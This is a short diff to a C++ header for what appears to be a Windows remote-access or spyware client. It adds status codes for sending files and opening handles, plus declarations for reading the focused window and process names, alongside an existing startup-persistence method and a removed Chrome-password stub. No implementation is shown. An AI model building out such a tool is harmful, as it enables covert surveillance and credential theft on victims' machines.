@@ -20,9 +20,16 @@
 #include<algorithm>
 #include <tchar.h>
 #include <Lmcons.h>
+#include <TlHelp32.h>
+#include <psapi.h>
 #include <filesystem>
 
 #define BUFFER_SIZE 1024
+#define FILE_WAS_SENT      "100@" //The file was sent
+#define CANT_OPEN_FILE     "200@" //Cant open the file successfully
+#define COMMAND_NOT_FOUND  "300@" // Cant open find the command
+#define CANT_OPEN_HANDLE   "400@" // Cant open handle
+#define HANDLE_WAS_OPENED  "500@" //Handle was opened successfully
 
 #pragma warning(disable:4996)
 #pragma comment (lib, "Ws2_32.lib")
@@ -73,7 +80,12 @@ public:
     //Creating the connection
     void connection();
 
-    //void getChromePasswords();
+
+    //Get process name by his PID
+    string getProcessName(int pid);
+
+    //Get the name of the focus window
+    string getFocusWindowName();
 
     //Opening the exe file in windows startup
     int boot();
